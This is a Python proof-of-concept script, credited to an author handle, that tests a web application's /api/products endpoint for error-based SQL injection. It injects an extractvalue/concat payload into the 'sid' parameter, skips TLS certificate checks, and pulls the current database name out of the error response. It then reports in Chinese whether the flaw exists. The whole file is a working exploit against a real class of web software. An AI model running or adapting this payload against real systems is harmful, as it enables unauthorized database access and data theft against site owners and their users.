#!/usr/bin/env python3
#-*- coding: utf-8 -*-
#author: myh0st@xazlsec

import base64
import requests
import urllib3
import sys
import json
import re

urllib3.disable_warnings()

patt = "'~([^']+)'"

def verify(site):
    burp0_url = site + "/api/products?page=1&limit=8&keyword=keyword&sid=extractvalue(1,concat(char(126),database()))&news=0&priceOrder&salesOrder"
    burp0_headers = {}
    r = requests.get(burp0_url, headers=burp0_headers, verify=False)
    info = re.findall(patt, r.text)
    if len(info) != 0:
        return info[0]
    else:
        return ""


if __name__=="__main__":
    target = sys.argv[1]
    info = verify(target)
    if info != "":
        print("[+]漏洞存在，获取当前数据库名称为：", info)
    else:
        print("[-]漏洞不存在")
